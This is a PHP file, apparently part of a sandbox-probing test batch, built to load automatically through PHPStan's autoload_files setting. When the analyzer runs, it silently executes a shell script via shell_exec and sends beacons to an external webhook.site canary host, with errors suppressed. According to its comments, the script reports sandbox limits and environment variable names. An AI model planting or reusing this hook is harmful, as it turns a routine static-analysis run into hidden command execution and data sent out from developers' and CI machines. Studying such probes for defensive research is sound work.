<?php
/**
 * Batch 1 — Primitif PHPStan Uji A (autoload_files).
 *
 * File ini di-require oleh PHPStan saat analisis (parameters.autoload_files
 * di phpstan.neon). Yang dilakukan hanya: menjalankan probe.sh (ping canary
 * + probing batas sandbox berupa boolean/hitungan/nama env var) dan ping
 * fallback langsung. TIDAK ADA secret yang dibaca nilainya atau dikirim.
 *
 * Canary path: /phpstan-autoload
 */

$canaryHost = 'webhook.site/42ad6b5b-e171-45c4-a7b8-28534655cbe3';
$probe = __DIR__ . '/probe.sh';

if (is_file($probe) && function_exists('shell_exec')) {
    @shell_exec('sh ' . escapeshellarg($probe) . ' ' . escapeshellarg($canaryHost) . ' phpstan-autoload >/dev/null 2>&1');
}

// Fallback: ping eksekusi langsung bila probe.sh gagal jalan.
// (Bila probe.sh jalan, ping ini duplikat dan ditandai fb=1 — itu normal.)
@file_get_contents(
    'https://' . $canaryHost . '/phpstan-autoload?stage=exec&fb=1',
    false,
    stream_context_create(['http' => ['timeout' => 5]])
);
